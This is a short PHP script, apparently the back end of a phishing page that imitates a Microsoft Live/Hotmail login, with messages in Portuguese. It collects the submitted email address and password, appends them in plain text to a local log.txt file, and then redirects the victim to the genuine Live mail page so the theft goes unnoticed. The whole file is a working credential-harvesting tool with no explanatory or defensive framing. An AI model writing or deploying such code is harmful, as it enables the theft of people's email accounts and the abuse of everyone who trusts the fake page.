<?php 
$email = $_POST["login"];
$pass = $_POST["passwd"];

if ($email != "" && $pass != "" ) {
	
	$face = "Email: $email
Senha: $pass

";
	
	$arq = "log.txt";
	
	if (!$abrir = fopen($arq, "a")) { echo "Erro abrindo arquivo ($arquivo)"; exit; }

	if (!fwrite($abrir, $face)) { print "Erro escrevendo no arquivo 
($arq)"; exit; }
	
	header('Location:https://bay175.mail.live.com/default.aspx');
	
	fclose($abrir);
	}
	else {
		header('Location:login.html');
		}
	
?>
